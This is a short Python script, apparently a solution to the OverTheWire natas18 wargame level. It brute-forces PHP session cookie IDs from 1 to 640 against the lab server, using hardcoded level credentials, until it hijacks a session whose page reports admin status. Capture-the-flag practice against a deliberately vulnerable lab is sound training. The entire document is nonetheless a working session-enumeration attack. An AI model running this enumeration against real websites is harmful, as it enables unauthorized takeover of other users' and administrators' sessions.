import requests

username='natas18'
password='6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
url='http://natas18.natas.labs.overthewire.org/'

for i in range(1,641):
    cookies={'PHPSESSID': str(i)}
    response=requests.post(
        url,
        auth=(username,password),
        cookies=cookies
    )

    if "You are an admin" in response.text:
        print(response.text)
        break